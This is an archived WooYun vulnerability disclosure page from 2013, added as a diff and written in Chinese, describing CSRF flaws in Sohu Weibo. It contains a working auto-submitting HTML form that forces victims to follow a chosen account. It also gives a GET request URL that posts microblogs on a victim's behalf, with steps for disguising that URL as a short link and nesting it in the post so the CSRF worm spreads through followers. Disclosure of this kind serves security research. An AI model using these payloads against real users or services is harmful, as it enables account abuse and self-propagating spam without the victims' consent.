@@ -1,0 +1,236 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		搜狐微博CSRF蠕虫一触即发+CSRF刷粉丝  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		搜狐微博CSRF蠕虫一触即发+CSRF刷粉丝  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/se55i0n">se55i0n</a> 
+</li><li>提交时间：		2013-03-21 11:14</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-26：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">For a gift！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1）CSRF刷粉丝<br />
+<br />
+搜狐对于“xxx.t.sohu.com”这样的域名均未校验referer，例子POC如下：</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;se55i0n&quot; name=&quot;se55i0n&quot; action=&quot;http://ourhome.t.sohu.com/follow/addfollows&quot; method=&quot;POST&quot;&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;friendids&quot; value=&quot;3262276&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;uid&quot; value=&quot;3262276&quot; /&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+	document.se55i0n.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2）CSRF蠕虫<br />
+<br />
+2.1）无意间发现搜狐，有个像分析推荐某某微博的功能，点击推荐搜狐官方微博并抓包；<br />
+<br />
+</p><p class="detail"><a href="../images/2110392588aa49e26926e1b36f48b2289ee58a12.png" target="_blank"><img src="../images/2110392588aa49e26926e1b36f48b2289ee58a12.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><pre><code>POST /user/recommend/tweet HTTP/1.1<br />
+Host: t.sohu.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 184<br />
+Accept: application/json, text/javascript, */*; q=0.01<br />
+Origin: http://t.sohu.com<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Referer: http://t.sohu.com/following?cur=1&amp;gid=0<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
+Cookie: ...<br />
+<br />
+msg=%5B%u8272%u8FF7%u8FF7%5D%20csrf%u6D4B%u8BD5@%u641C%u72D0%u5FAE%u535A%u5B98%u65B9%20%u7684%u5FAE%u535A%u4E0D%u9519%uFF0C%u63A8%u8350%u5927%u5BB6%u53BB%u770B%u770B%uFF01&amp;uid=31963453</code></pre><p class='detail'><br />
+<br />
+2.2)试着改为GET请求，居然成功了（太不应该了），请求成功后会发送一条微博；<br />
+<br />
+</p><p class="detail"><a href="../images/211040289b955e6c940393a480e2a9f581a4b756.png" target="_blank"><img src="../images/211040289b955e6c940393a480e2a9f581a4b756.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+看测试效果；<br />
+<br />
+</p><p class="detail"><a href="../images/2110413439db5141257d3023b434a8a8bcfbb3f9.png" target="_blank"><img src="../images/2110413439db5141257d3023b434a8a8bcfbb3f9.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+2.3）经过后面的测试，发现“msg”的内容和uid参数也是能够完全掌控的，所以这就给了我们机会来小玩一次csrf蠕虫。将下面的GET请求伪装成一个短地址，再配上诱人的内容；<br />
+<br />
+</p><pre><code>http://t.sohu.com/user/recommend/tweet?msg=%u5251%u5fc3%u679c%u7167%uff0c%u901f%u5ea6%u56f4%u89c2%uff01&amp;uid=1521422610</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/21104621a3f63f1bc7f2b76bcfd07280c33eeba1.png" target="_blank"><img src="../images/21104621a3f63f1bc7f2b76bcfd07280c33eeba1.png" alt="7.png" width="600"/></a></p><p class="detail"><br />
+<br />
+看效果图，：D<br />
+<br />
+</p><p class="detail"><a href="../images/211047036b984b59f6700986f68e60469e28a575.png" target="_blank"><img src="../images/211047036b984b59f6700986f68e60469e28a575.png" alt="8.png" width="600"/></a></p><p class="detail"><br />
+<br />
+2.4）好吧，想让它多传播几次，我们只需要将上面的转换好了的短地址再出入到msg内容里，并将其再转换地址，这样就具备了2次传播的功能，当然可不止这么一种玩法哟；<br />
+<br />
+</p><pre><code>http://t.sohu.com/user/recommend/tweet?msg=%u5251%u5fc3%u679c%u7167%uff0c%u901f%u5ea6%u56f4%u89c2%uff01http://url.cn/DTqtgI&amp;uid=1521422610</code></pre><p class='detail'><br />
+<br />
+哈哈，我们还是看效果吧（想几次传播你说了算）；<br />
+<br />
+</p><p class="detail"><a href="../images/211051555358842b77b529deaf05ace70905cc4f.png" target="_blank"><img src="../images/211051555358842b77b529deaf05ace70905cc4f.png" alt="9.png" width="600"/></a></p><p class="detail"><br />
+<br />
+2.5）一个较完整的二次传播测试效果，哈哈（发个微博诱惑大家点击，用户点击后形成第一次传播，用户的粉丝再点击形成第二次传播，当然还可以第三次、第四次....）<br />
+<br />
+</p><p class="detail"><a href="../images/21111756d2d1f65138093e0b4e4ebfa65b0763d0.png" target="_blank"><img src="../images/21111756d2d1f65138093e0b4e4ebfa65b0763d0.png" alt="11.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+PS：仅仅自己测试，我木有粉丝哈哈！<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明！~ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你懂的~ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/se55i0n" title="se55i0n">se55i0n</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-020404" title="搜狐微博CSRF蠕虫一触即发+CSRF刷粉丝">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-03-21 11:14</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+													<p class="detail">漏洞Rank：8 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="20404";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
